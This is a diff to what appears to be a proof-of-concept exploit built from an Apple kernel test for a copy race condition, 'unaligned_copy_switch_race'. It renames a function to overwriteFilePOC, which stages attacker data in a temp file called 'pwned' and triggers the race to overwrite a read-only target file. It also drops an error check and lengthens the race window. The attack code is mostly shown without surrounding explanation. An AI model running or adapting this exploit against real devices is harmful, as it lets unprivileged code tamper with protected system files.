@@ -224,10 +224,6 @@ T_DECL(unaligned_copy_switch_race,
             overwrite_first_diff_value = ((char*)ro_addr)[off];
         }
     }
-    if (overwrite_first_diff_offset == -1) {
-        fprintf(stderr, "no diff?\n");
-        return;
-    }
 
     /*
      * get a handle on some writable memory that will be temporarily
@@ -265,7 +261,7 @@ T_DECL(unaligned_copy_switch_race,
     /* wait for racing thread to be ready to run */
     dispatch_semaphore_wait(ctx->running_sem, DISPATCH_TIME_FOREVER);
 
-    duration = 1; /* 10 seconds */
+    duration = 10; /* 10 seconds */
     T_LOG("Testing for %ld seconds...", duration);
     for (start = time(NULL), loops = 0;
         time(NULL) < start + duration;
@@ -361,12 +357,12 @@ T_DECL(unaligned_copy_switch_race,
     T_PASS("Ran %d times in %ld seconds with no failure", loops, duration);
 }
 
-void overwriteFile_Haxi0(NSData *data, NSString *path) {
+void overwriteFilePOC(NSData *data, NSString *path) {
     dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
         g_arg_target_file_path = [path UTF8String];
         // save the data to a temp file
         NSString *model_path = [NSTemporaryDirectory() stringByAppendingPathComponent:@"pwned"];
-        [data writeToFile:model_path atomically:NO];
+        [data writeToFile:model_path atomically:YES];
         g_arg_overwrite_file_path = [model_path UTF8String];
         unaligned_copy_switch_race();
     });
